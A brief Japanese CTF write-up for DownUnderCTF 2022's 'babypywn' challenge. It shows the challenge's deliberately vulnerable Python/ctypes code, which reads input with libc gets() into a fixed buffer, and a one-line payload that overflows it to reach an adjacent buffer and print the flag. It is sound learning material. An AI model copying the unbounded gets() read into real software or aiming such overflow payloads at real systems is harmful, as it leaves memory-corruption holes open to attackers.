# babypwywn - DownUnderCTF2022
この問題は`buf1`のBOFを利用して`buf2`にDUCTFという文字列を書き込むことが目的。

## 解法
サーバーで動いているコードを見ると、
明らかなBufferOverflowが存在していると考えられます。
```python
#!/usr/bin/env python3

from ctypes import CDLL, c_buffer
libc = CDLL('/lib/x86_64-linux-gnu/libc.so.6')
buf1 = c_buffer(512)
buf2 = c_buffer(512)
libc.gets(buf1)
if b'DUCTF' in bytes(buf2):
    print(open('./flag.txt', 'r').read())
```

`buf2`の中に`DUCTF`という文字が入っていればいいので、
以下のpayloadを送信します。
```python
io.sendline(b"DUCTF"*1024)
```

